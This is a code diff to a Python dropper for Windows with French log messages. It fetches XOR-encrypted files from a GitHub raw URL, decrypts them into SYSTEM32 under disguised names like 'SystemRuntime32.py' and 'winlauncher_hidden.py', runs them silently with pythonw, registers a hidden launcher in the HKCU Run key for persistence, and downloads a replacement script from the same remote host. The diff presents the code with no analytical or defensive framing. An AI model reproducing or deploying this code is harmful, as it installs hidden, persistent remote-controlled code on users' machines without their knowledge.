@@ -1,6 +1,4 @@
 import os
-import sys
-import shutil
 import winreg
 import tempfile
 import requests
@@ -17,17 +15,20 @@ LAUNCHER_NAME = "winlauncher_hidden.py"
 RUN_KEY_NAME = "WinLauncherHidden"
 RAW_SCRIPT_REPLACEMENT = "https://raw.githubusercontent.com/luxamind141/installation/main/FuckNGLclear.txt"
 
-def decrypt(content: bytes, key: str) -> str:
+
+def decrypt(content: bytes, key: str) -> bytes:
     key_bytes = key.encode()
     key_len = len(key_bytes)
     decrypted = bytearray()
     for i, b in enumerate(content):
         decrypted.append(b ^ key_bytes[i % key_len])
-    return decrypted.decode(errors='ignore')
+    return bytes(decrypted)
 
-def write_file(path, content):
-    with open(path, "w", encoding="utf-8") as f:
-        f.write(content)
+
+def write_file_binary(path, content_bytes):
+    with open(path, "wb") as f:
+        f.write(content_bytes)
+
 
 def download_and_install():
     paths = {}
@@ -38,14 +39,14 @@ def download_and_install():
             response.raise_for_status()
 
             print(f"[i] Décryptage de {filename_enc}...")
-            decrypted = decrypt(response.content, CLE)
-            if not decrypted:
+            decrypted_bytes = decrypt(response.content, CLE)
+            if not decrypted_bytes:
                 print(f"[!] Échec du décryptage de {filename_enc}")
                 return None
 
             target_path = os.path.join(SYSTEM32, filename_enc[:-4])
             print(f"[i] Écriture du fichier décrypté dans {target_path}...")
-            write_file(target_path, decrypted)
+            write_file_binary(target_path, decrypted_bytes)
 
             if not os.path.isfile(target_path):
                 print(f"[!] Le fichier {target_path} n'a pas été créé.")
@@ -59,37 +60,38 @@ def download_and_install():
             return None
     return paths
 
+
 def run_systemruntime32_immediately(path):
     print(f"[i] Lancement immédiat de {path} en arrière-plan.")
     subprocess.Popen(['pythonw.exe', path], close_fds=True)
 
+
 def create_launcher():
-    launcher_code = f"""
-import subprocess
+    launcher_code = f"""import subprocess
 import os
-subprocess.Popen(['pythonw.exe', os.path.join(r'{SYSTEM32}', 'SystemRuntime32.py')])
+subprocess.Popen(['pythonw.exe', os.path.join(r'{SYSTEM32}', 'SystemRuntime32.py')], close_fds=True)
 """
     launcher_path = os.path.join(SYSTEM32, LAUNCHER_NAME)
-    write_file(launcher_path, launcher_code)
+    with open(launcher_path, "w", encoding="utf-8") as f:
+        f.write(launcher_code)
+    print(f"[✓] Launcher créé : {launcher_path}")
     return launcher_path
+
 
 def add_to_startup(py_path):
     reg_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
     try:
         with winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path, 0, winreg.KEY_SET_VALUE) as key:
-            winreg.SetValueEx(key, RUN_KEY_NAME, 0, winreg.REG_SZ, f"pythonw.exe \"{py_path}\"")
+            winreg.SetValueEx(key, RUN_KEY_NAME, 0, winreg.REG_SZ, f'pythonw.exe "{py_path}"')
         print("[✓] Script ajouté au démarrage.")
     except Exception as e:
-        print(f"[!] Impossible d'ajouter au démarrage : {e}")
+        print(f"[!] Erreur ajout au démarrage : {e}")
+
 
 def remplacer_script_depuis_s_path():
-    import os
-    import requests
-    import tempfile
-
     temp_dir = tempfile.gettempdir()
     fichier_temp = os.path.join(temp_dir, "s_path.txt")
-    raw_url = "https://raw.githubusercontent.com/luxamind141/installation/main/FuckNGLclear.txt"
+    raw_url = RAW_SCRIPT_REPLACEMENT
 
     print(f"[i] Temp dir : {temp_dir}")
     print(f"[i] Fichier trace : {fichier_temp}")
@@ -108,15 +110,18 @@ def remplacer_script_depuis_s_path():
         return
 
     try:
-        print(f"[...] Téléchargement script clair depuis {raw_url}")
+        print(f"[...] Téléchargement script clair depuis {raw_url}...")
         r = requests.get(raw_url, timeout=10)
-        if r.status_code == 200 and r.text.strip():
+        r.raise_for_status()
+
+        if r.text.strip():
             with open(chemin_script, "w", encoding="utf-8") as f_script:
                 f_script.write(r.text)
             print(f"[✓] Script clair mis à jour avec succès : {chemin_script}")
         else:
-            print(f"[!] Échec téléchargement script clair. Code HTTP : {r.status_code}")
+            print("[!] Contenu téléchargé vide.")
             return
+
     except Exception as e:
         print(f"[!] Erreur téléchargement script clair : {e}")
         return
@@ -127,26 +132,25 @@ def remplacer_script_depuis_s_path():
     except Exception as e:
         print(f"[!] Erreur suppression s_path.txt : {e}")
 
+
 def main():
     if not os.access(SYSTEM32, os.W_OK):
         print("[!] Ce script doit être exécuté avec des droits administrateur.")
         return
 
-    print("[i] Téléchargement et installation des scripts...")
     paths = download_and_install()
-    if paths is None:
-        print("[!] Échec de l'installation des scripts. Arrêt.")
+    if not paths:
+        print("[!] Installation échouée.")
         return
 
     if 'SystemRuntime32.py' in paths:
         run_systemruntime32_immediately(paths['SystemRuntime32.py'])
-    else:
-        print("[!] Le fichier SystemRuntime32.py n'a pas été installé, lancement impossible.")
-        return
 
     launcher_path = create_launcher()
     add_to_startup(launcher_path)
+
     remplacer_script_depuis_s_path()
+
 
 if __name__ == "__main__":
     main()
